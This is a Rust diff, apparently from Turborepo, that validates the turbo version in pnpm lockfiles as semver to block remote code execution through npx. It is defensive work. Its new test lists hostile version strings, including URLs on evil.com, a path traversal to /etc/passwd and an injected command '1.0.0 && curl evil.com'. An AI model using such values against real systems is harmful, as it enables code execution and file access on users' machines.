@@ -4,6 +4,7 @@ use std::{
     collections::{BTreeMap, HashMap},
 };
 
+use semver::Version;
 use serde::{Deserialize, Serialize};
 use turbopath::RelativeUnixPathBuf;
 
@@ -539,6 +540,14 @@ impl crate::Lockfile for PnpmLockfile {
             // Look through all of the workspace packages for a turbo dependency
             // grab the first one we find.
             .find_map(|project| project.dependencies.turbo_version())?;
+        // pnpm versions can include peer dependency suffixes like "1.4.6_peer_suffix"
+        // or peer deps in parens like "1.4.6(react@18.2.0)".
+        // Extract the base semver part for validation.
+        let base_version = turbo_version
+            .split(['_', '('])
+            .next()
+            .unwrap_or(turbo_version);
+        Version::parse(base_version).ok()?;
         Some(turbo_version.to_owned())
     }
 
@@ -1334,6 +1343,39 @@ c:
     fn test_turbo_version(lockfile: &[u8], expected: Option<&str>) {
         let lockfile = PnpmLockfile::from_bytes(lockfile).unwrap();
         assert_eq!(lockfile.turbo_version().as_deref(), expected);
+    }
+
+    #[test]
+    fn test_turbo_version_rejects_non_semver() {
+        // Malicious version strings that could be used for RCE via npx should be
+        // rejected
+        let malicious_versions = [
+            "file:./malicious.tgz",
+            "https://evil.com/malicious.tgz",
+            "git+https://github.com/evil/repo.git",
+            "../../../etc/passwd",
+            "1.0.0 && curl evil.com",
+        ];
+
+        for malicious_version in malicious_versions {
+            let yaml = format!(
+                r#"lockfileVersion: '9.0'
+importers:
+  .:
+    dependencies:
+      turbo:
+        specifier: ^2.0.0
+        version: {malicious_version}
+"#
+            );
+            let lockfile = PnpmLockfile::from_bytes(yaml.as_bytes()).unwrap();
+            assert_eq!(
+                lockfile.turbo_version(),
+                None,
+                "should reject malicious version: {}",
+                malicious_version
+            );
+        }
     }
 
     #[test]
